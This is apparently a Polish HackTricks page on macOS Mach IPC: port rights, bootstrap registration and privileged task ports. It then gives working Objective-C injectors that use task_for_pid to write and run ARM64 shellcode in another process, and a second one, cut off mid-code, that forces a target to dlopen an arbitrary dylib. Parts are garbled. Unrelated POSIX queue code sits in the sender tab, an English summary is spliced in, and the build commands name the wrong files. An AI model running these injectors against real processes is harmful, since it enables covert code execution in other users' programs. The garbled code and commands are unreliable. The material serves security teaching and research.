# macOS IPC - Komunikacja międzyprocesowa

{% hint style="success" %}
Dowiedz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
{% endhint %}

## Komunikacja Mach za pomocą portów

### Podstawowe informacje

Mach używa **zadań** jako **najmniejszej jednostki** do dzielenia zasobów, a każde zadanie może zawierać **wiele wątków**. Te **zadania i wątki są mapowane 1:1 na procesy i wątki POSIX**.

Komunikacja między zadaniami odbywa się za pomocą Komunikacji Międzyprocesowej Mach (IPC), wykorzystując jednokierunkowe kanały komunikacyjne. **Wiadomości są przesyłane między portami**, które działają jak **kolejki wiadomości** zarządzane przez jądro.

Każdy proces ma **tabelę IPC**, w której można znaleźć **porty mach procesu**. Nazwa portu mach to właściwie liczba (wskaźnik do obiektu jądra).

Proces może również wysłać nazwę portu z pewnymi uprawnieniami **do innego zadania**, a jądro spowoduje, że ta pozycja pojawi się w **tabeli IPC innego zadania**.

### Prawa portów

Prawa portów, które określają, jakie operacje może wykonać zadanie, są kluczowe dla tej komunikacji. Możliwe **prawa portów** to ([definicje stąd](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Prawo odbierania**, które pozwala na odbieranie wiadomości wysłanych do portu. Porty Mach są kolejkami MPSC (wielu producentów, jeden konsument), co oznacza, że może istnieć tylko **jedno prawo odbierania dla każdego portu** w całym systemie (w przeciwieństwie do potoków, gdzie wiele procesów może trzymać deskryptory plików do końca odczytu jednego potoku).
* **Zadanie z prawem odbierania** może odbierać wiadomości i **tworzyć prawa wysyłania**, umożliwiając wysyłanie wiadomości. Początkowo tylko **własne zadanie ma prawo odbierania nad swoim portem**.
* **Prawo wysyłania**, które pozwala na wysyłanie wiadomości do portu.
* Prawo wysyłania można **klonować**, więc zadanie posiadające prawo wysyłania może sklonować prawo i **przekazać je trzeciemu zadaniu**.
* **Prawo wysyłania raz**, które pozwala na wysłanie jednej wiadomości do portu, a następnie zniknie.
* **Prawo zestawu portów**, które oznacza _zestaw portów_ zamiast pojedynczego portu. Usuwanie wiadomości z zestawu portów usuwa wiadomość z jednego z zawartych portów. Zestawy portów można używać do nasłuchiwania na kilku portach jednocześnie, podobnie jak `select`/`poll`/`epoll`/`kqueue` w Unix.
* **Martwa nazwa**, która nie jest faktycznym prawem portu, ale jedynie miejscem. Gdy port zostanie zniszczony, wszystkie istniejące prawa portów do portu zamieniają się w martwe nazwy.

**Zadania mogą przekazywać prawa WYSYŁANIA innym**, umożliwiając im wysyłanie wiadomości z powrotem. **Prawa WYSYŁANIA można również klonować, więc zadanie może zduplikować i przekazać prawo trzeciemu zadaniu**. To, w połączeniu z pośrednim procesem znanym jako **serwer startowy**, umożliwia efektywną komunikację między zadaniami.

### Porty plików

Porty plików pozwalają na zamknięcie deskryptorów plików w portach Mac (za pomocą praw portów Mach). Możliwe jest utworzenie `fileport` z danego FD za pomocą `fileport_makeport` i utworzenie FD z fileport za pomocą `fileport_makefd`.

### Ustanowienie komunikacji

#### Kroki:

Jak wspomniano, aby ustanowić kanał komunikacyjny, zaangażowany jest **serwer startowy** (**launchd** w systemie Mac).

1. Zadanie **A** inicjuje **nowy port**, uzyskując **prawo odbierania** w procesie.
2. Zadanie **A**, będąc posiadaczem prawa odbierania, **generuje prawo wysyłania dla portu**.
3. Zadanie **A** nawiązuje **połączenie** z **serwerem startowym**, dostarczając **nazwę usługi portu** i **prawo wysyłania** poprzez procedurę znana jako rejestracja startowa.
4. Zadanie **B** współdziała z **serwerem startowym**, aby wykonać **wyszukiwanie startowe dla nazwy usługi**. W przypadku powodzenia **serwer duplikuje prawo wysyłania** otrzymane od Zadania A i **przekazuje je do Zadania B**.
5. Po uzyskaniu prawa wysyłania, Zadanie **B** jest zdolne do **formułowania** **wiadomości** i wysyłania jej **do Zadania A**.
6. Dla komunikacji dwukierunkowej zazwyczaj zadanie **B** generuje nowy port z **prawem odbierania** i **prawem wysyłania**, a **prawo wysyłania przekazuje do Zadania A**, aby mogło wysyłać wiadomości do Zadania B (komunikacja dwukierunkowa).

Serwer startowy **nie może uwierzytelnić** nazwy usługi twierdzonej przez zadanie. Oznacza to, że **zadanie** potencjalnie **może podszywać się pod dowolne zadanie systemowe**, na przykład **fałszywie twierdząc nazwę usługi autoryzacji** i zatwierdzając każde żądanie.

Następnie Apple przechowuje **nazwy usług dostarczanych przez system** w bezpiecznych plikach konfiguracyjnych, znajdujących się w chronionych katalogach SIP: `/System/Library/LaunchDaemons` i `/System/Library/LaunchAgents`. Obok każdej nazwy usługi przechowywany jest również **powiązany plik binarny**. Serwer startowy utworzy i będzie posiadał **prawo odbierania dla każdej z tych nazw usług**.

Dla tych predefiniowanych usług, **proces wyszukiwania różni się nieco**. Gdy nazwa usługi jest wyszukiwana, launchd uruchamia usługę dynamicznie. Nowy schemat postępowania jest następujący:

* Zadanie **B** inicjuje **wyszukiwanie startowe** dla nazwy usługi.
* **launchd** sprawdza, czy zadanie jest uruchomione, i jeśli nie, **uruchamia** je.
* Zadanie **A** (usługa) wykonuje **rejestrację startową**. Tutaj **serwer startowy tworzy prawo wysyłania, zatrzymuje je i przekazuje prawo odbierania do Zadania A**.
* launchd duplikuje **prawo wysyłania i wysyła je do Zadania B**.
* Zadanie **B** generuje nowy port z **prawem odbierania** i **prawem wysyłania**, a **prawo wysyłania przekazuje do Zadania A** (usługi), aby mogło wysyłać wiadomości do Zadania B (komunikacja dwukierunkowa).

Jednak ten proces dotyczy tylko predefiniowanych zadań systemowych. Zadania spoza systemu wciąż działają zgodnie z pierwotnym opisem, co potencjalnie może pozwolić na podszywanie się. 

### Wiadomość Mach

[Znajdź więcej informacji tutaj](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Funkcja `mach_msg`, będąca w zasadzie wywołaniem systemowym, jest wykorzystywana do wysyłania i odbierania wiadomości Mach. Funkcja wymaga, aby wiadomość była wysłana jako argument początkowy. Wiadomość ta musi rozpoczynać się od struktury `mach_msg_header_t`, a następnie zawierać rzeczywistą treść wiadomości. Struktura jest zdefiniowana następująco:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Procesy posiadające _**prawo odbioru**_ mogą odbierać wiadomości na porcie Mach. Z kolei **nadawcy** otrzymują _**prawo wysyłania**_ lub _**prawo wysłania raz**_. Prawo wysłania raz służy wyłącznie do wysłania pojedynczej wiadomości, po czym staje się nieważne.

Aby osiągnąć łatwą **komunikację dwukierunkową**, proces może określić **port mach** w nagłówku mach o nazwie _port odpowiedzi_ (**`msgh_local_port`**), gdzie **odbiorca** wiadomości może **wysłać odpowiedź** na tę wiadomość. Flagi bitowe w **`msgh_bits`** mogą być używane do **wskazania**, że dla tego portu powinno zostać utworzone i przekazane **prawo wysłania raz** (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Zauważ, że tego rodzaju komunikacja dwukierunkowa jest używana w wiadomościach XPC, które oczekują odpowiedzi (`xpc_connection_send_message_with_reply` i `xpc_connection_send_message_with_reply_sync`). Ale **zazwyczaj tworzone są różne porty**, jak wyjaśniono wcześniej, aby utworzyć komunikację dwukierunkową.
{% endhint %}

Pozostałe pola nagłówka wiadomości to:

* `msgh_size`: rozmiar całego pakietu.
* `msgh_remote_port`: port, na który wysłana jest ta wiadomość.
* `msgh_voucher_port`: [vouchery mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: ID tej wiadomości, który jest interpretowany przez odbiorcę.

{% hint style="danger" %}
Zauważ, że **wiadomości mach są wysyłane przez port mach**, który jest kanałem komunikacji **jednego odbiorcy** i **wielu nadawców** wbudowanym w jądro mach. **Wiele procesów** może **wysyłać wiadomości** do portu mach, ale w dowolnym momencie tylko **jeden proces może czytać** z niego.
{% endhint %}

### Wylicz porty
```bash
lsmp -p <pid>
```
Możesz zainstalować to narzędzie w iOS, pobierając je z [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Przykład kodu

Zauważ, jak **nadawca** **przydziela** port, tworzy **prawo wysyłania** dla nazwy `org.darlinghq.example` i wysyła je do **serwera rozruchowego**, podczas gdy nadawca poprosił o **prawo wysyłania** tej nazwy i użył go do **wysłania wiadomości**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}Wysyłanie komunikatu IPC za pomocą kolejki komunikatów POSIX:

```c
#include <stdio.h>
#include <stdlib.h>
#include <mqueue.h>

int main() {
    mqd_t mq;
    struct mq_attr attr;
    attr.mq_flags = 0;
    attr.mq_maxmsg = 10;
    attr.mq_msgsize = 128;
    attr.mq_curmsgs = 0;

    mq = mq_open("/test_queue", O_CREAT | O_WRONLY, 0644, &attr);
    if (mq == -1) {
        perror("mq_open");
        exit(1);
    }

    mq_send(mq, "Hello", 5, 0);

    mq_close(mq);

    return 0;
}
```
{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
### Przywilejowane porty

* **Port hosta**: Jeśli proces ma uprawnienie **Wysyłanie** do tego portu, może uzyskać **informacje** o **systemie** (np. `host_processor_info`).
* **Port hosta z uprawnieniami roota**: Proces z prawem **Wysyłanie** do tego portu może wykonywać **przywilejowane akcje**, takie jak ładowanie rozszerzenia jądra. **Proces musi być rootem**, aby uzyskać to uprawnienie.
* Ponadto, aby wywołać API **`kext_request`**, konieczne jest posiadanie innych uprawnień **`com.apple.private.kext*`**, które są udzielane tylko binariom Apple.
* **Port nazwy zadania**: Nieprzywilejowana wersja _portu zadania_. Odwołuje się do zadania, ale nie pozwala na jego kontrolę. Jedyną dostępną przez niego rzeczą wydaje się być `task_info()`.
* **Port zadania** (znany również jako port jądra)**:** Posiadając uprawnienie Wysyłanie do tego portu, możliwe jest kontrolowanie zadania (odczyt/zapis pamięci, tworzenie wątków...).
* Wywołaj `mach_task_self()` aby **uzyskać nazwę** tego portu dla zadania wywołującego. Ten port jest dziedziczony tylko podczas **`exec()`**; nowe zadanie utworzone za pomocą `fork()` otrzymuje nowy port zadania (jako szczególny przypadek, zadanie również otrzymuje nowy port zadania po `exec()` w binarnym pliku suid). Jedynym sposobem na uruchomienie zadania i uzyskanie jego portu jest wykonanie ["tancerki z portami"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) podczas `fork()`.
* Oto ograniczenia dostępu do portu (z `macos_task_policy` z binariów `AppleMobileFileIntegrity`):
* Jeśli aplikacja ma uprawnienie **`com.apple.security.get-task-allow`**, procesy od **tego samego użytkownika mogą uzyskać dostęp do portu zadania** (zazwyczaj dodawane przez Xcode do debugowania). Proces notaryzacji nie zezwoli na to w wersjach produkcyjnych.
* Aplikacje z uprawnieniem **`com.apple.system-task-ports`** mogą uzyskać **port zadania dla dowolnego** procesu, z wyjątkiem jądra. W starszych wersjach nazywano to **`task_for_pid-allow`**. Udzielane jest to tylko aplikacjom Apple.
* **Root może uzyskać dostęp do portów zadań** aplikacji **nie** skompilowanych z **zabezpieczonym** środowiskiem wykonawczym (i nie pochodzących od Apple).

### Wstrzykiwanie kodu shell w wątek za pomocą portu zadania

Możesz pobrać kod shell z:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} {% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Skompiluj** poprzedni program i dodaj **uprawnienia** umożliwiające wstrzykiwanie kodu z tym samym użytkownikiem (jeśli nie, będziesz musiał użyć **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>  

### macOS IPC (Inter-Process Communication)

Inter-Process Communication (IPC) is a mechanism that allows processes to communicate and share data with each other. macOS provides several IPC mechanisms, including:

- **Mach Messages**: Low-level IPC mechanism used by macOS for inter-process communication.
- **XPC**: Apple's high-level API for creating inter-process communication.
- **Distributed Objects**: Allows objects to be used across process boundaries.
- **Unix Domain Sockets**: Communication mechanism between processes on the same host.

Understanding these IPC mechanisms is crucial for analyzing the security implications and potential privilege escalation vectors in macOS systems.
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Wstrzykiwanie dylib w wątek za pomocą portu zadania

W systemie macOS **wątki** mogą być manipulowane za pomocą **Mach** lub za pomocą **api `pthread` posix**. Wątek wygenerowany w poprzednim wstrzyknięciu został wygenerowany za pomocą api Mach, więc **nie jest zgodny z posix**.

Było możliwe **wstrzyknięcie prostego shellcode'u** w celu wykonania polecenia, ponieważ **nie było konieczne korzystanie z api zgodnego z posix**, a jedynie z Mach. **Bardziej złożone wstrzyknięcia** wymagałyby, aby **wątek** był również **zgodny z posix**.

Dlatego, aby **ulepszyć wątek**, należy wywołać **`pthread_create_from_mach_thread`**, który **utworzy poprawny wątek pthread**. Następnie ten nowy wątek pthread mógłby **wywołać dlopen**, aby **załadować dylib** z systemu, zamiast pisać nowy shellcode do wykonywania różnych akcji, można załadować niestandardowe biblioteki.

Można znaleźć **przykładowe dyliby** (na przykład ten, który generuje logi, które można później odczytać):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

